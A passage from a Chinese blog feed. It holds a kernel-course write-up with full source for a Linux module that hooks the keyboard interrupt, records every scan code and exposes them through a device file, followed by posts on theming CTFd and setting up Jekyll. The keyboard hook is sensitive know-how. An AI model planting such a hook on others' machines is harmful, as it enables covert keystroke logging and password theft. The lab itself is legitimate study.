0; // 按键次数记录static int buf_size = 20, original_size; // 存储扫描码的缓冲区大小static struct kfifo key_buf; // 内核队列DEFINE_MUTEX(buf_lock); // 互斥锁DEFINE_SPINLOCK(key_lock); // 自旋锁static DECLARE_WAIT_QUEUE_HEAD(waitq); // 等待</code></pre><p>实现工作队列调度函数，其中获取每次键盘中断的扫描码，并且将按下按键的扫描码存入 kfifo 队列，并将 <code>key_count</code> 自加 1。如果队列满，则将第一个元素出队列。每次检测 <code>buf_size</code> 是否改变，如果改变则更新 <code>original_size</code>，并将原始的 <code>key_buf</code> 释放后重新申请一块内存作为新的 kfifo 队列。最后唤醒等待队列：</p><pre><code class="cpp">void key_work_func(struct work_struct *q) { // 工作队列调度函数    int ret; // 返回值    unsigned char code, t;    spin_lock(&amp;key_lock); // 加上自旋锁    code = scancode; // 获取当前扫描码    spin_unlock(&amp;key_lock);    if (code == 0xe0) { // 某些按键的特征符号        ;    } else if (code &amp; 0x80) { // 释放按键        ;    } else { // 按下按键        mutex_lock(&amp;buf_lock);        if (kfifo_is_full(&amp;key_buf)) {            kfifo_out(&amp;key_buf, &amp;t, sizeof(unsigned char));        }        kfifo_in(&amp;key_buf, (void *)&amp;code, sizeof(unsigned char)); // 将扫描码入队列        key_count++;        printk(&quot;[DEBUG] code = 0x%x, key_count = %d.\n&quot;, code, key_count);        if (buf_size != original_size) { // 判断缓冲区大小是否改变            printk(&quot;[DEBUG] buf_size = %d (original buf_size = %d).\n&quot;, buf_size, original_size);            original_size = buf_size;            kfifo_free(&amp;key_buf); // 释放原本的kfifo队列            ret = kfifo_alloc(&amp;key_buf, buf_size, GFP_ATOMIC); // 重新申请一块内存作为新的队列            if (ret) {                printk(&quot;[!] Allocate memory failed.\n&quot;);                return ret;            }        }        wake_up_interruptible(&amp;waitq); // 唤醒睡眠进程        mutex_unlock(&amp;buf_lock);    }}</code></pre><p>声明工作队列 <code>key_work</code>，定义函数 <code>key_int_handler</code> 来获取每次键盘中断，并在中断下半部调度工作队列：</p><pre><code class="cpp">DECLARE_WORK(key_work, key_work_func); // 声明工作队列irq_handler_t key_int_handler(int irq, void *dev) {    spin_lock(&amp;key_lock);    scancode = inb(0x60); // 获取扫描码    spin_unlock(&amp;key_lock);    spin_lock(&amp;key_lock);    status = inb(0x64); // 获取按键状态    spin_unlock(&amp;key_lock);    schedule_work(&amp;key_work); // 调度工作队列    return (irq_handler_t)IRQ_HANDLED;}</code></pre><p>实现对字符设备驱动程序的 <code>read</code> 函数。先对 <code>count</code> 字段进行判断，然后在等待进程被唤醒且满足给定条件后开始读取扫描码。每次将队列中指定长度的扫描码读出并传递到用户空间：</p><pre><code class="cpp">static ssize_t myread(struct file *filp, char __user *buf, size_t count, loff_t *pos) { // 读设备函数    unsigned char *c;    int ret;    if (count == 0) { // 传入的count值不能为0        printk(&quot;[!] Count can not be 0.\n&quot;);        return -1;    }    printk(&quot;[DEBUG] kfifo_len = %d.\n&quot;, kfifo_len(&amp;key_buf));    if (wait_event_interruptible(waitq, (kfifo_len(&amp;key_buf) &gt;= count))) // 睡眠并等待唤醒        return -ERESTARTSYS;    c = (unsigned char *)kmalloc(count, GFP_KERNEL); // 申请一块内存    mutex_lock(&amp;buf_lock);    kfifo_out(&amp;key_buf, c, count); // 将指定长度扫描码数据出队列    mutex_unlock(&amp;buf_lock);    printk(&quot;[+] Copy buffer to user: %s.\n&quot;, c);    ret = copy_to_user(buf, c, count); // 将出队列的扫描码传给用户空间    kfree(c); // 释放申请的内存空间    c = 0; // 防止UAF    return count;}</code></pre><p>字符设备驱动程序对应的 <code>open</code> 和 <code>release</code> 函数都不做任何额外的操作，最后初始化一个全局结构体 <code>key_fops</code>，即用于存储设备驱动程序的三种操作：</p><pre><code class="cpp">static int myopen(struct inode *inode, struct file *filp) { // 打开设备函数    printk(&quot;[+] Device opened.\n&quot;);    return 0;}static int myrelease(struct inode *inode, struct file *filp) { // 释放设备函数    printk(&quot;[+] Device released.\n&quot;);    return 0;}struct file_operations key_fops = { // 初始化文件访问操作函数    .open = myopen,    .read = myread,    .release = myrelease,};</code></pre><p>为了实现 <code>key_count</code> 和 <code>buf_size</code> 两个属性，需要分别定义两个属性的读写函数：</p><pre><code class="cpp">static ssize_t key_count_show(struct device *o, struct device_attribute *attr, char *buf) { // 属性key_count的读函数    return sprintf(buf, &quot;%d\n&quot;, key_count);}static ssize_t key_count_store(struct device *o, struct device_attribute *attr, const char *buf, size_t count) { // 属性key_count的写函数    sscanf(buf, &quot;%d&quot;, &amp;key_count);    return count;}static ssize_t buf_size_show(struct device *o, struct device_attribute *attr, char *buf) { // 属性buf_size的读函数    return sprintf(buf, &quot;%d\n&quot;, buf_size);}static ssize_t buf_size_store(struct device *o, struct device_attribute *attr, const char *buf, size_t count) { // 属性buf_size的写函数    sscanf(buf, &quot;%d&quot;, &amp;buf_size);    return count;}// https://blog.csdn.net/njuitjf/article/details/16849333static DEVICE_ATTR(key_count, 0444, key_count_show, key_count_store); // 创建字符设备属性key_countstatic DEVICE_ATTR(buf_size, 0664, buf_size_show, buf_size_store); // 创建字符设备属性buf_size</code></pre><p>接下来定义一个 <code>attribute</code> 结构体 <code>key_attrs</code>，存入两个全局变量对应的属性，并创建一个 <code>attribute_group</code> 结构体 <code>key_group</code> 存储 <code>key_attrs</code>：</p><pre><code class="cpp">static struct attribute *key_attrs[] = {    &amp;dev_attr_key_count.attr,    &amp;dev_attr_buf_size.attr,    NULL,};static const struct attribute_group key_group = {    .attrs = key_attrs,};</code></pre><p>在模块的入口函数中，先创建一个 kfifo 队列，用于存储键盘扫描码；然后注册中断请求服务，并设置函数 <code>key_int_handler</code> 作为中断服务函数：</p><pre><code class="cpp">    // Allocate kfifo    printk(&quot;[DEBUG] buf_size = %d.\n&quot;, buf_size);    original_size = buf_size; // 存储原始缓冲区大小    ret = kfifo_alloc(&amp;key_buf, buf_size, GFP_ATOMIC); // 申请kfifo队列    if (ret) {        printk(&quot;[!] Allocate memory failed.\n&quot;);        return ret;    }    printk(&quot;[+] Allocate kfifo successfully.\n&quot;);    // Trigger interrupt    ret = request_irq(1, (irq_handler_t)key_int_handler, IRQF_SHARED, &quot;Key Hook&quot;, (void *)key_int_handler); // 申请IRQ    if (ret) {        printk(&quot;[!] Request irq failed.\n&quot;);        return ret;    }    printk(&quot;[+] Request irq successfully.\n&quot;);</code></pre><p>接下来按顺序分别分配设备编号、初始化字符设备、添加字符设备到系统中、创建一个类并注册到内核中以及创建一个设备驱动程序并注册到 sysfs 中。最后通过 sysfs 借口创建驱动程序对应的两个属性。中间如果有发生错误，就会依次删除先前创建的内容：</p><pre><code class="cpp">    // Register devices    printk(&quot;[*] Invoke alloc_chrdev_region.\n&quot;);    ret = alloc_chrdev_region(&amp;dev_id, 0, 1, &quot;ex5&quot;); // 动态分配设备编号    if (ret &gt;= 0) {        printk(&quot;[*] Invoke cdev_init.\n&quot;);        cdev_init(&amp;key_dev, &amp;key_fops); // 初始化字符设备        key_dev.owner = THIS_MODULE; // 设置实现驱动的模块为当前模块        printk(&quot;[*] Invoke cdev_add.\n&quot;);        ret = cdev_add(&amp;key_dev, dev_id, 1); // 添加字符设备到系统中        if (ret &gt;= 0) {            printk(&quot;[*] Invoke class_create.\n&quot;);            key_class = class_create(THIS_MODULE, &quot;ex5&quot;); // 创建一个类并注册到内核中            if (key_class) {                printk(&quot;[*] Invoke device_create.\n&quot;);                dev = device_create(key_class, NULL, dev_id, NULL, &quot;ex5&quot;); // 创建一个设备并注册到sysfs中                if (dev) {                    printk(&quot;[*] Invoke sysfs_create_group.\n&quot;);                    // http://linux-kernel.2935.n7.nabble.com/kernel-BUG-at-fs-sysfs-group-c-65-td612891.html                    printk(&quot;[DEBUG] struct device *dev-&gt;kobj = %p.\n&quot;, &amp;dev-&gt;kobj);                    ret = sysfs_create_group(&amp;dev-&gt;kobj, &amp;key_group); // 通过sysfs接口创建驱动对应的属性                    if (ret == 0) { // 创建成功后直接跳转并返回0                        goto success;                    } else {                        printk(&quot;[!] Invoke sysfs_create_group failed.\n&quot;);                        device_destroy(key_class, dev_id); // 删除设备                    }                } else {                    printk(&quot;[!] Invoke device_create failed.\n&quot;);                    class_destroy(key_class); // 删除类                }            } else {                printk(&quot;[!] Invoke class_create failed.\n&quot;);            }            cdev_del(&amp;key_dev); // 删除字符设备        } else {            printk(&quot;[!] Invoke cdev_add failed.\n&quot;);        }        unregister_chrdev_region(dev_id, 1); // 释放设备编号        return ret;    }failed:    printk(&quot;[!] Invoke alloc_chrdev_region failed.\n&quot;);    return ret;success:    printk(&quot;[+] Create charactor device successfully.\n&quot;);    return 0;</code></pre><p>最后在模块退出时分别释放 IRQ、释放 kfifo 队列、删除设备驱动程序、删除类、删除字符设备以及释放设备编号：</p><pre><code class="cpp">static void __exit hello_exit(void) { // 模块出口函数    printk(&quot;========== [+] Remove module. ==========\n&quot;);    printk(&quot;[*] Free irq.\n&quot;);    free_irq(1, (void *)key_int_handler); // 释放IRQ    printk(&quot;[*] Free kfifo.\n&quot;);    kfifo_free(&amp;key_buf); // 释放队列    printk(&quot;[*] Invoke device_destroy.\n&quot;);    device_destroy(key_class, dev_id); // 删除设备    printk(&quot;[*] Invoke class_destroy.\n&quot;);    class_destroy(key_class); // 删除类    printk(&quot;[*] Invoke cdev_del.\n&quot;);    cdev_del(&amp;key_dev); // 删除字符设备    printk(&quot;[*] Invoke unregister_chrdev_region.\n&quot;);    unregister_chrdev_region(dev_id, 1); // 释放设备编号}</code></pre><p>在用户空间编写应用程序来读取驱动程序中存储的扫描码：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#define BUF_SIZE 0x40 // 设置缓冲区int main() {    int fd, c, i;    unsigned char buf[BUF_SIZE]; // 初始化缓冲区    // sudo mknod /dev/ex4 c 444 0    fd = open(&quot;/dev/ex5&quot;, O_RDONLY); // 打开字符设备    if (fd &lt; 0) {        printf(&quot;[!] File open error.\n&quot;);        return -1;    }    while (1) {        c = read(fd, buf, BUF_SIZE); // 读取字符设备中的扫描码        printf(&quot;[+] Read scancode: %s (%d).\n&quot;, buf, c); // 把扫描码以字符串的形式输出    }    close(fd); // 关闭字符设备    return 0;}</code></pre><h1 id="四、-程序测试及结果"><a href="#四、-程序测试及结果" class="headerlink" title="四、 程序测试及结果"></a>四、 程序测试及结果</h1><p>安装模块后，看到字符设备驱动程序已经正常创建，且开始存储键盘的扫描码：</p><p><img src="/pics/实现获取键盘中断的字符设备驱动程序/1.png" srcset="/img/loading.gif" alt></p><p>在运行编写好的用户程序，看到从 kfifo 队列中读取出了指定长度的字节：</p><p><img src="/pics/实现获取键盘中断的字符设备驱动程序/2.png" srcset="/img/loading.gif" alt></p><p>查看 <code>key_count</code> 的值，使用 dmesg 查看得到 <code>key_count</code> 为 113，然后输入回车查看 <code>/sys/class</code> 下的存储的驱动程序属性 <code>key_count</code> 为 114，正好时输入了回车后自加了 1：</p><p><img src="/pics/实现获取键盘中断的字符设备驱动程序/3.png" srcset="/img/loading.gif" alt></p><p>查看此时 <code>buf_size</code> 的值为 20，然后修改其值为 40（因为 kfifo 的申请会将传入的长度自动对其到 2 的幂次方，故原本的 kfifo 队列长度应该为 32，修改后的长度变为 64）：</p><p><img src="/pics/实现获取键盘中断的字符设备驱动程序/4.png" srcset="/img/loading.gif" alt></p><p>此时查看输出 <code>buf_size</code> 已改变：</p><p><img src="/pics/实现获取键盘中断的字符设备驱动程序/5.png" srcset="/img/loading.gif" alt></p><p>再修改用户应用程序中的 <code>BUF_SIZE</code> 为 0x40，也可以正常读取到：</p><p><img src="/pics/实现获取键盘中断的字符设备驱动程序/6.png" srcset="/img/loading.gif" alt></p><p>如果再把驱动程序中的 <code>buf_size</code> 改小，就会导致 kfifo 队列中的元素最多为 32 个（<code>buf_size</code> 为 20 会自动向上对齐到 2 的幂次方），而应用程序中必须要读 0x40 个字符，永远达到不了标准，就会导致永远读取不到数据：</p><p><img src="/pics/实现获取键盘中断的字符设备驱动程序/7.png" srcset="/img/loading.gif" alt></p><h1 id="五、-总结"><a href="#五、-总结" class="headerlink" title="五、 总结"></a>五、 总结</h1><p>在这次的实验中，熟悉了字符设备驱动程序以及 sysfs，并且将先前学过的内核数据结构、中断、进程调度、进程同步等相关知识结合，对 Linux 内核有了更深的理解。</p><h1 id="附录：代码"><a href="#附录：代码" class="headerlink" title="附录：代码"></a>附录：代码</h1><pre><code class="cpp">#include &lt;linux/module.h&gt;#include &lt;linux/init.h&gt;#include &lt;linux/kernel.h&gt;#include &lt;linux/kfifo.h&gt;#include &lt;linux/workqueue.h&gt;#include &lt;linux/interrupt.h&gt;#include &lt;linux/slab.h&gt;#include &lt;linux/uaccess.h&gt;#include &lt;linux/cdev.h&gt;MODULE_LICENSE(&quot;GPL&quot;);MODULE_AUTHOR(&quot;assassinq&quot;);MODULE_DESCRIPTION(&quot;create char device module&quot;);// Variables for device creationdev_t dev_id; // 设备号struct cdev key_dev; // 字符设备结构体struct class *key_class; // 字符设备对应的类// Variables for keyboard interruptstatic unsigned char scancode, status; // 键盘扫描码、状态static int key_count = 0; // 按键次数记录static int buf_size = 20, original_size; // 存储扫描码的缓冲区大小static struct kfifo key_buf; // 内核队列DEFINE_MUTEX(buf_lock); // 互斥锁DEFINE_SPINLOCK(key_lock); // 自旋锁static DECLARE_WAIT_QUEUE_HEAD(waitq); // 等待void key_work_func(struct work_struct *q) { // 工作队列调度函数    int ret; // 返回值    unsigned char code, t;    spin_lock(&amp;key_lock); // 加上自旋锁    code = scancode; // 获取当前扫描码    spin_unlock(&amp;key_lock);    if (code == 0xe0) { // 某些按键的特征符号        ;    } else if (code &amp; 0x80) { // 释放按键        // printk(&quot;In work: released \&quot;%s\&quot;\n&quot;, mappings[code - 0x80]);    } else { // 按下按键        // printk(&quot;In work: pressed \&quot;%s\&quot;\n&quot;, mappings[code]);        mutex_lock(&amp;buf_lock);        // if (kfifo_is_full(&amp;key_buf)) {        //     kfifo_out(&amp;key_buf, &amp;t, sizeof(unsigned char));        // }        kfifo_in(&amp;key_buf, (void *)&amp;code, sizeof(unsigned char)); // 将扫描码入队列        key_count++;        printk(&quot;[DEBUG] code = 0x%x, key_count = %d.\n&quot;, code, key_count);        if (buf_size != original_size) { // 判断缓冲区大小是否改变            printk(&quot;[DEBUG] buf_size = %d (original buf_size = %d).\n&quot;, buf_size, original_size);            original_size = buf_size;            kfifo_free(&amp;key_buf); // 释放原本的kfifo队列            ret = kfifo_alloc(&amp;key_buf, buf_size, GFP_ATOMIC); // 重新申请一块内存作为新的队列            if (ret) {                printk(&quot;[!] Allocate memory failed.\n&quot;);                return ret;            }        }        wake_up_interruptible(&amp;waitq); // 唤醒睡眠进程        mutex_unlock(&amp;buf_lock);    }}DECLARE_WORK(key_work, key_work_func); // 声明工作队列irq_handler_t key_int_handler(int irq, void *dev) {    spin_lock(&amp;key_lock);    scancode = inb(0x60); // 获取扫描码    spin_unlock(&amp;key_lock);    spin_lock(&amp;key_lock);    status = inb(0x64); // 获取按键状态    spin_unlock(&amp;key_lock);    // printk(&quot;Key interrupt: scancode = 0x%x, status = 0x%x\n&quot;, scancode, status);    schedule_work(&amp;key_work); // 调度工作队列    return (irq_handler_t)IRQ_HANDLED;}static int myopen(struct inode *inode, struct file *filp) { // 打开设备函数    printk(&quot;[+] Device opened.\n&quot;);    return 0;}static ssize_t myread(struct file *filp, char __user *buf, size_t count, loff_t *pos) { // 读设备函数    unsigned char *c;    int ret;    if (count == 0) { // 传入的count值不能为0        printk(&quot;[!] Count can not be 0.\n&quot;);        return -1;    }    printk(&quot;[DEBUG] kfifo_len = %d.\n&quot;, kfifo_len(&amp;key_buf));    if (wait_event_interruptible(waitq, (kfifo_len(&amp;key_buf) &gt;= count))) // 睡眠并等待唤醒        return -ERESTARTSYS;    c = (unsigned char *)kmalloc(count, GFP_KERNEL); // 申请一块内存    mutex_lock(&amp;buf_lock);    kfifo_out(&amp;key_buf, c, count); // 将指定长度扫描码数据出队列    mutex_unlock(&amp;buf_lock);    printk(&quot;[+] Copy buffer to user: %s.\n&quot;, c);    ret = copy_to_user(buf, c, count); // 将出队列的扫描码传给用户空间    kfree(c); // 释放申请的内存空间    c = 0; // 防止UAF    return count;}static int myrelease(struct inode *inode, struct file *filp) { // 释放设备函数    printk(&quot;[+] Device released.\n&quot;);    return 0;}struct file_operations key_fops = { // 初始化文件访问操作函数    .open = myopen,    .read = myread,    .release = myrelease,};static ssize_t key_count_show(struct device *o, struct device_attribute *attr, char *buf) { // 属性key_count的读函数    return sprintf(buf, &quot;%d\n&quot;, key_count);}static ssize_t key_count_store(struct device *o, struct device_attribute *attr, const char *buf, size_t count) { // 属性key_count的写函数    sscanf(buf, &quot;%d&quot;, &amp;key_count);    return count;}static ssize_t buf_size_show(struct device *o, struct device_attribute *attr, char *buf) { // 属性buf_size的读函数    return sprintf(buf, &quot;%d\n&quot;, buf_size);}static ssize_t buf_size_store(struct device *o, struct device_attribute *attr, const char *buf, size_t count) { // 属性buf_size的写函数    sscanf(buf, &quot;%d&quot;, &amp;buf_size);    return count;}// https://blog.csdn.net/njuitjf/article/details/16849333static DEVICE_ATTR(key_count, 0444, key_count_show, key_count_store); // 创建字符设备属性key_countstatic DEVICE_ATTR(buf_size, 0664, buf_size_show, buf_size_store); // 创建字符设备属性buf_sizestatic struct attribute *key_attrs[] = {    &amp;dev_attr_key_count.attr,    &amp;dev_attr_buf_size.attr,    NULL,};static const struct attribute_group key_group = {    .attrs = key_attrs,};static int __init hello_init(void) { // 模块入口函数    int ret;    struct device *dev;    printk(&quot;========== [+] Init module. ==========\n&quot;);    // ret = register_chrdev(444, &quot;ex4HookDriver&quot;, &amp;key_fops);    // if (ret) {    //     printk(&quot;[!] Unable to register character device.\n&quot;);    //     return ret;    // }    // Allocate kfifo    printk(&quot;[DEBUG] buf_size = %d.\n&quot;, buf_size);    original_size = buf_size; // 存储原始缓冲区大小    ret = kfifo_alloc(&amp;key_buf, buf_size, GFP_ATOMIC); // 申请kfifo队列    if (ret) {        printk(&quot;[!] Allocate memory failed.\n&quot;);        return ret;    }    printk(&quot;[+] Allocate kfifo successfully.\n&quot;);    // Trigger interrupt    ret = request_irq(1, (irq_handler_t)key_int_handler, IRQF_SHARED, &quot;Key Hook&quot;, (void *)key_int_handler); // 申请IRQ    if (ret) {        printk(&quot;[!] Request irq failed.\n&quot;);        return ret;    }    printk(&quot;[+] Request irq successfully.\n&quot;);    // Register devices    printk(&quot;[*] Invoke alloc_chrdev_region.\n&quot;);    ret = alloc_chrdev_region(&amp;dev_id, 0, 1, &quot;ex5&quot;); // 动态分配设备编号    if (ret &gt;= 0) {        printk(&quot;[*] Invoke cdev_init.\n&quot;);        cdev_init(&amp;key_dev, &amp;key_fops); // 初始化字符设备        key_dev.owner = THIS_MODULE; // 设置实现驱动的模块为当前模块        printk(&quot;[*] Invoke cdev_add.\n&quot;);        ret = cdev_add(&amp;key_dev, dev_id, 1); // 添加字符设备到系统中        if (ret &gt;= 0) {            printk(&quot;[*] Invoke class_create.\n&quot;);            key_class = class_create(THIS_MODULE, &quot;ex5&quot;); // 创建一个类并注册到内核中            if (key_class) {                printk(&quot;[*] Invoke device_create.\n&quot;);                dev = device_create(key_class, NULL, dev_id, NULL, &quot;ex5&quot;); // 创建一个设备并注册到sysfs中                if (dev) {                    printk(&quot;[*] Invoke sysfs_create_group.\n&quot;);                    // http://linux-kernel.2935.n7.nabble.com/kernel-BUG-at-fs-sysfs-group-c-65-td612891.html                    printk(&quot;[DEBUG] struct device *dev-&gt;kobj = %p.\n&quot;, &amp;dev-&gt;kobj);                    ret = sysfs_create_group(&amp;dev-&gt;kobj, &amp;key_group); // 通过sysfs接口创建驱动对应的属性                    if (ret == 0) { // 创建成功后直接跳转并返回0                        goto success;                    } else {                        printk(&quot;[!] Invoke sysfs_create_group failed.\n&quot;);                        device_destroy(key_class, dev_id); // 删除设备                    }                } else {                    printk(&quot;[!] Invoke device_create failed.\n&quot;);                    class_destroy(key_class); // 删除类                }            } else {                printk(&quot;[!] Invoke class_create failed.\n&quot;);            }            cdev_del(&amp;key_dev); // 删除字符设备        } else {            printk(&quot;[!] Invoke cdev_add failed.\n&quot;);        }        unregister_chrdev_region(dev_id, 1); // 释放设备编号        return ret;    }failed:    printk(&quot;[!] Invoke alloc_chrdev_region failed.\n&quot;);    return ret;success:    printk(&quot;[+] Create charactor device successfully.\n&quot;);    return 0;}static void __exit hello_exit(void) { // 模块出口函数    printk(&quot;========== [+] Remove module. ==========\n&quot;);    printk(&quot;[*] Free irq.\n&quot;);    free_irq(1, (void *)key_int_handler); // 释放IRQ    printk(&quot;[*] Free kfifo.\n&quot;);    kfifo_free(&amp;key_buf); // 释放队列    printk(&quot;[*] Invoke device_destroy.\n&quot;);    device_destroy(key_class, dev_id); // 删除设备    printk(&quot;[*] Invoke class_destroy.\n&quot;);    class_destroy(key_class); // 删除类    printk(&quot;[*] Invoke cdev_del.\n&quot;);    cdev_del(&amp;key_dev); // 删除字符设备    printk(&quot;[*] Invoke unregister_chrdev_region.\n&quot;);    unregister_chrdev_region(dev_id, 1); // 释放设备编号}module_init(hello_init);module_exit(hello_exit);</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>自定义CTFd颜色主题</title>
    <link href="/2020/05/20/%E8%87%AA%E5%AE%9A%E4%B9%89CTFd%E9%A2%9C%E8%89%B2%E4%B8%BB%E9%A2%98/"/>
    <url>/2020/05/20/%E8%87%AA%E5%AE%9A%E4%B9%89CTFd%E9%A2%9C%E8%89%B2%E4%B8%BB%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>今年校赛轮到 17 级来办了，搭建平台的时候踩的一些坑记录一下。</p><a id="more"></a><h1 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h1><p>以前练习平台其实搭过很多次，都是用 Ubuntu 或者直接 <code>docker-compose up</code> 起镜像。后来发现 <a href="https://hub.docker.com/r/ctfd/ctfd" target="_blank" rel="noopener">CTFd 在 Docker Hub 上</a>是有镜像的，直接拉下来就能装了。</p><pre><code class="bash">$ docker pull ctfd/ctfd$ screen docker run --name=&quot;ZJGSUCTF-2020&quot; -p 80:8000 -it ctfd/ctfd</code></pre><p>进入容器进行修改：</p><pre><code class="bash">$ docker ps -aCONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                    NAMES729035bc1dc7        ctfd/ctfd           &quot;/opt/CTFd/docker-en…&quot;   42 seconds ago      Up 38 seconds       0.0.0.0:80-&gt;8000/tcp     ZJGSUCTF-2020$ docker exec -it quizzical_mayer /bin/sh</code></pre><p>可以看到容器的启动脚本 <code>docker-entrypoint.sh</code>，其中用 <code>gunicorn</code> 作为 Web 服务器：</p><pre><code class="bash">/opt/CTFd $ tail docker-entrypoint.sh# Start CTFdecho &quot;Starting CTFd&quot;exec gunicorn &#39;CTFd:create_app()&#39; \    --bind &#39;0.0.0.0:8000&#39; \    --workers $WORKERS \    --worker-tmp-dir &quot;$WORKER_TEMP_DIR&quot; \    --worker-class &quot;$WORKER_CLASS&quot; \    --access-logfile &quot;$ACCESS_LOG&quot; \    --error-logfile &quot;$ERROR_LOG&quot;</code></pre><h1 id="Configuration"><a href="#Configuration" class="headerlink" title="Configuration"></a>Configuration</h1><p>对颜色的设置首先可以在 Admin Panel 里选择 Theme Color：</p><p><img src="/pics/自定义CTFd颜色主题/1.png" srcset="/img/loading.gif" alt></p><p>效果如下：</p><p><img src="/pics/自定义CTFd颜色主题/2.png" srcset="/img/loading.gif" alt></p><p>改了 Theme Color 后，Challenge 里的每个 Challenge Box 的颜色还是没变，显得不太协调，可以在 themes 下修改对应的 css：</p><pre><code class="bash">/opt/CTFd/CTFd/themes/core/static/css $ vi main.min.css</code></pre><p><code>.btn-dark</code> 是默认的 Challenge Box 的颜色：</p><pre><code class="css">.btn-dark {  color: #fff;  background-color: #343a40;  border-color: #343a40;}</code></pre><p>还有修改 Solved Challenge Box 的颜色：</p><pre><code class="bash">/opt/CTFd/CTFd/themes/core/static/css $ vi challenge-board.min.css</code></pre><p>对应的样式如下：</p><pre><code class="css">.solved-challenge {  background-color: #37d63e !important;  opacity: 0.4;  border: none;}</code></pre><p>改完后的效果如下：</p><p><img src="/pics/自定义CTFd颜色主题/3.png" srcset="/img/loading.gif" alt></p><h1 id="Else"><a href="#Else" class="headerlink" title="Else"></a>Else</h1><p>国外的开源项目总是会有一些问题，这里我们也要把对应的 <code>flag-icons.scss</code> 和 <code>__init__.py</code> 部分给删除，或者像 BUUOJ 一样改为 Taiwan SAR China：</p><pre><code class="bash">/opt/CTFd/CTFd $ grep -ir &quot;Taiwan&quot; *themes/core/assets/css/includes/flag-icons.scss:  // Taiwanutils/countries/__init__.py:    (&quot;TW&quot;, &quot;Taiwan&quot;),utils/countries/__pycache__/__init__.cpython-37.pyc:St. Martin)ZPMzSt. Pierre &amp; Miquelon)ZVCzSt. Vincent &amp; Grenadines)ZSDZSudan)ZSRSuriname)ZSJzSvalbard &amp; Jan Mayen)ZSZZ    Swaziland)ZSEZSweden)ZCHZ                                                                 Switzerland)ZSYZSyria)ZTWZTaiwan)ZTJZ</code></pre><p>由于这部分是用 Python 写的，不会实时更新，这里直接重启 <code>gunicorn</code> 来刷新缓存（重启第二个，也就是这里的 8 号进程）：</p><pre><code class="bash">/opt/CTFd $ ps aux | grep gunicorn    1 ctfd      0:00 {gunicorn} /usr/local/bin/python /usr/local/bin/gunicorn CTFd:create_app() --bind 0.0.0.0:8000 --workers 1 --worker-tmp-dir /dev/shm --worker-class gevent --access-logfile - --error-logfile -    8 ctfd      0:01 {gunicorn} /usr/local/bin/python /usr/local/bin/gunicorn CTFd:create_app() --bind 0.0.0.0:8000 --workers 1 --worker-tmp-dir /dev/shm --worker-class gevent --access-logfile - --error-logfile -   38 ctfd      0:00 grep gunicorn/opt/CTFd $ kill -HUP 8/opt/CTFd $ ps aux | grep gunicorn    1 ctfd      0:00 {gunicorn} /usr/local/bin/python /usr/local/bin/gunicorn CTFd:create_app() --bind 0.0.0.0:8000 --workers 1 --worker-tmp-dir /dev/shm --worker-class gevent --access-logfile - --error-logfile -   39 ctfd      0:00 {gunicorn} /usr/local/bin/python /usr/local/bin/gunicorn CTFd:create_app() --bind 0.0.0.0:8000 --workers 1 --worker-tmp-dir /dev/shm --worker-class gevent --access-logfile - --error-logfile -   41 ctfd      0:00 grep gunicorn</code></pre><p>后来在其他师傅博客上看到了<a href="https://www.52hertz.tech/2020/03/15/CTFd_second_develop/" target="_blank" rel="noopener">一篇完善 CTFd 功能的文章</a>，这边记录一下，以后有机会再实现。</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.cnblogs.com/huchong/p/9844024.html" target="_blank" rel="noopener">https://www.cnblogs.com/huchong/p/9844024.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ctfd</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>macOS下使用Jekyll和Coding搭建博客</title>
    <link href="/2020/05/17/macOS%E4%B8%8B%E4%BD%BF%E7%94%A8Jekyll%E5%92%8CCoding%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
    <url>/2020/05/17/macOS%E4%B8%8B%E4%BD%BF%E7%94%A8Jekyll%E5%92%8CCoding%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<p>仅作记录。</p><a id="more"></a><h1 id="Preparation"><a href="#Preparation" class="headerlink" title="Preparation"></a>Preparation</h1><p>环境是 macOS Mojave，像是 command-line tools、ruby 之类的安装就不记录了。用的是 Coding 提供的静态网站服务，经过测试 jekyll 3.5 可以正常部署（版本过高在部署的时候会报错），依次安装对应的 bundle 和 jekyll：</p><pre><code class="bash">$ gem install bundle:1.15.4$ gem install -n /usr/local/bin/ jekyll -v &quot;3.5&quot;</code></pre><h1 id="Setup-Site"><a href="#Setup-Site" class="headerlink" title="Setup Site"></a>Setup Site</h1><p>先在 coding 上创建一个新的仓库，并开启静态网站服务，然后克隆到本地：</p><pre><code class="bash">$ git clone xxx.git blog &amp;&amp; cd blog</code></pre><p>接下来用 <code>jekyll new .</code> 在仓库中新建静态网站，并做相关的依赖安装，最后用 <code>jekyll build</code> 生成静态网站代码：</p><pre><code class="bash">$ bundle exec jekyll new .$ bundle install$ bundle exec jekyll build</code></pre><p>不看 git 的话，大概会有如下的文件。大致上和 hexo 的根目录差不了太多：</p><pre><code class="bash">$ find .../_posts./_posts/2020-05-17-welcome-to-jekyll.markdown./.sass-cache./.sass-cache/81a794e6149bb69272e907db97d7f50b54a1e9e5./.sass-cache/81a794e6149bb69272e907db97d7f50b54a1e9e5/_syntax-highlighting.scssc./.sass-cache/81a794e6149bb69272e907db97d7f50b54a1e9e5/_base.scssc./.sass-cache/81a794e6149bb69272e907db97d7f50b54a1e9e5/_layout.scssc./.sass-cache/27601696a600f8c750bfb957d6267563e8022d5f./.sass-cache/27601696a600f8c750bfb957d6267563e8022d5f/minima.scssc./404.html./.gitignore./index.md./_site./_site/feed.xml./_site/jekyll./_site/jekyll/update./_site/jekyll/update/2020./_site/jekyll/update/2020/05./_site/jekyll/update/2020/05/17./_site/jekyll/update/2020/05/17/welcome-to-jekyll.html./_site/index.html./_site/404.html./_site/about./_site/about/index.html./_site/assets./_site/assets/main.css./_site/assets/minima-social-icons.svg./_config.yml./Gemfile./Gemfile.lock</code></pre><p>可以用 <code>jekyll serve</code> 在本地对网站进行预览：</p><pre><code class="bash">$ bundle exec jekyll 